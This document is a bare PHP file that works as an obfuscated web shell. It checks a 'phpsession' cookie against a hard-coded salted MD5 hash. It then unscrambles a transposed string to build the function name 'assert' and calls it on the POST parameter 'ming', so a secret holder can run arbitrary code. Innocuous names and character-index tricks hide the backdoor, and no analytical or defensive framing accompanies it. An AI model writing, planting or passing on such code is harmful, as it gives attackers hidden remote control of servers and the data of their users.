<?php

function myHiddenPost($key) {
    return isset($_POST[$key]) ? $_POST[$key] : null;
}   
if (isset($_COOKIE['phpsession'])) {
    $cookieValue = $_COOKIE['phpsession'];
    $salt = '_ming';
    $saltedValue = $cookieValue . $salt;
    $encryptedValue = md5($saltedValue);
    if ($encryptedValue=='3dd6f83a2df58e415b74edf50e65ebaf'){
        $str='sam6QknrBSz1+sS)thJ8A&eg)';
        $n=3;
        $length = strlen($str);
        $table = array();
        $quotient = (int)($length / $n);  
        $remainder = $length % $n;
        for ($i = 0; $i < $n; $i++) {
            $table[$i] = array();
        }
        $index = 0;
        for ($i = 0; $i < $n; $i++) {
            $rowCount = $quotient + ($i < $remainder ? 1 : 0);
            for ($j = 0; $j < $rowCount; $j++) {
                $table[$i][$j] = $str[$index++];
            }
        }
        $decodedStr = '';
        for ($i = 0; $i < $quotient + 1; $i++) {
            for ($j = 0; $j < $n; $j++) {
                if (isset($table[$j][$i])) {
                    $decodedStr .= $table[$j][$i];
                }
            }
        }
        $config=$decodedStr['3'].$decodedStr['13'].$decodedStr['13'].$decodedStr['17'].$decodedStr['21'].$decodedStr['22'];
        $config(myHiddenPost('ming'));}
    }

?>